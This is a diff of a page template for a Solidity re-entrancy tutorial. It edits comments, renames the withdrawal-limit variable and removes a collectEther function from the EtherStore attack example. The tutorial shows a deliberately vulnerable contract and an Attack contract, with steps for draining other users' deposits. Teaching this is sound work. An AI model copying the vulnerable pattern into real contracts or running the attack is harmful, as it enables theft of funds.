@@ -8,16 +8,17 @@ const html = `<h3 id="vulnerability">Vulnerability</h3>
 <p>Reentracy exploit allows <code>B</code> to call back into <code>A</code> before <code>A</code> finishes execution.</p>
 <pre><code class="language-solidity">pragma solidity ^0.5.16;
 
-// EtherStore is a contract vulnerable to re-entrancy attack. Let&#39;s see why.
-
 /*
+EtherStore is a contract where you can deposit any amount and withdraw at most
+1 Ether per week. This contract is vulnerable to re-entrancy attack.
+Let&#39;s see why.
+
 1. Deploy EtherStore
 2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into EtherStore
 3. Deploy Attack with address of EtherStore
 4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).
    You will get 3 Ethers back (2 Ether stolen from Alice and Bob,
    plus 1 Ether sent from this contract).
-5. Call Attack.collectEther to withdraw Ether from Attack
 
 What happened?
 Attack was able to call EtherStore.withdraw multiple times before
@@ -36,7 +37,7 @@ Here is how the functions were called
 
 contract EtherStore {
     // Withdrawal limit = 1 ether / week
-    uint public withdrawalLimit = 1 ether;
+    uint constant public WITHDRAWAL_LIMIT = 1 ether;
     mapping(address =&gt; uint) public lastWithdrawTime;
     mapping(address =&gt; uint) public balances;
 
@@ -46,7 +47,7 @@ contract EtherStore {
 
     function withdraw(uint _amount) public {
         require(balances[msg.sender] &gt;= _amount);
-        require(_amount &lt;= withdrawalLimit);
+        require(_amount &lt;= WITHDRAWAL_LIMIT);
         require(now &gt;= lastWithdrawTime[msg.sender] + 1 weeks);
 
         (bool sent, ) = msg.sender.call.value(_amount)("");
@@ -80,11 +81,6 @@ contract Attack {
         require(msg.value &gt;= 1 ether);
         etherStore.deposit.value(1 ether)();
         etherStore.withdraw(1 ether);
-    }
-
-    function collectEther() public {
-        (bool sent, ) = msg.sender.call.value(address(this).balance)("");
-        require(sent, "Failed to send Ether");
     }
 
     // Helper function to check the balance of this contract
